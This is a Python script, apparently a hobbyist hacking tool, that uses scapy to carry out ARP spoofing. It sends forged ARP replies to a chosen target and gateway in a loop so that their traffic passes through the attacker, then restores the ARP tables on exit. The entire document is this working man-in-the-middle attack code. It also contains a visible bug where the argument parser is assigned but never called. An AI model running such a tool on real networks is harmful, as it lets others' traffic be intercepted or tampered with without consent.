import scapy.all as scapy
import time
import optparse

def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
	arp_request_broadcast = broadcast/arp_request
	answered = scapy.srp(arp_request_broadcast, timeout=10, verbose=False)[0]
	
	return answered[0][1].hwsrc
	

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False) #verbose is used to not display unnecessary output


def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, count=4, verbose=False)
	


def get_arguments():
	parser = optparse.OptionParser()
	parser.add_option("-t","--target", dest="target_ip", help="Target IP")
	parser.add_option("-g","--gateway", dest="gateway_ip", help="Target IP")
	(options, arguments) = parser.parse_args()
	return options 


options = get_arguments
target_ip = options.target_ip	#"192.168.1.7"
gateway_ip = options.gateway_ip	#"192.168.1.1"



try: 
	sent_packets_count = 0 
	while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, target_ip)
		sent_packets_count = sent_packets_count + 2 
		print("\r" + "[+] Sent two packets: " + str(sent_packets_count), end = "") 
		time.sleep(2) 
except KeyboardInterrupt:
	print("\n [+] Quitting...And Resetting ARP table......\n")
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)

